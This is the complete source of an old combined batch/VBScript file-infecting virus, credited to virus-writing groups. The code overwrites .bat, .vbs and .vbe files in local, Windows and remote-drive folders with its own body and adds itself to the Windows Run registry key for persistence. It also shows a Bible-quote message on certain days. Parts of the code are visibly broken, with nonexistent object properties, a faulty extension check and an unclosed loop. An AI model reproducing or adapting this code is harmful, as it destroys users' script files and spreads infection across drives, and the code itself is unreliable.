On Error Resume Next
@Echo Off
::BAT/VBS.Lokie.a
::by -KD- [Metaphase VX Team & NoMercyVirusTeam]
::Worlds First VBScript / Batch Infector
echo y| copy %0 *.bat >nul
echo y| copy %0 %winbootdir%\*.bat >nul
echo y| copy %0 %windir%\*.bat >nul
echo y| copy %0 *.vbs >nul
echo y| copy %0 %winbootdir%\*.vbs >nul
echo y| copy %0 %windir%\*.vbs >nul
echo y| copy %0 *.vbe >nul
echo y| copy %0 %winbootdir%\*.vbe >nul
echo y| copy %0 %windir%\*.vbe >nul
Set WShell = CreateObject("WScript.Shell")
Parent = Wscript.ScriptFullName
Set FSO = Createobject("Scripting.FileSystemObject")
If Day(Now()) = 1 or Day(Now()) = 10 or Day(Now()) = 25 then
MsgBox "So shall it be at the end of the world: The Angels shall" & _ 
Chr(13) & Chr(10) & "come forth and sever the wicked from among the just." _ 
& Chr(13) & Chr(10) & Chr(13) & Chr(10) & _ 
"Matthew 13:49" & Chr(13) & Chr(10) & "BAT/VBS.Loki" , 4096, "BAT/VBS.Loki"
End If
FSO.CopyFile Parent, "C:\WINDOWS\System\Loki.vbs"
WShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Loki", _ 
"Wscript.exe C:\Windows\System\Loki.vbs %"
Set DS = FSO.Drives
For Each D In DS
If D.Drivetype = Remote Then
 DF = D & "\"
 Call Catch(DF)
ElseIf D.IsReady Then
 DF = D & "\"
 Call Catch(DF)
End If
Sub Catch(TheFolder)
Set FolderX = FSO.GetFolder(TheFolder)
Set FilesToGet = FolderX.FilesToGet
For Each File In FilesToGet
If FSO.GetExtensionName(File.TheFolder) = "bat" or "vbs" or "vbe" Then
 FSO.CopyFile Parent, File.TheFolder, True
End If
Next
Set File = FolderX.Catch
 For Each Loki In File
 Call Catch(Loki.TheFolder)
Next
End Sub
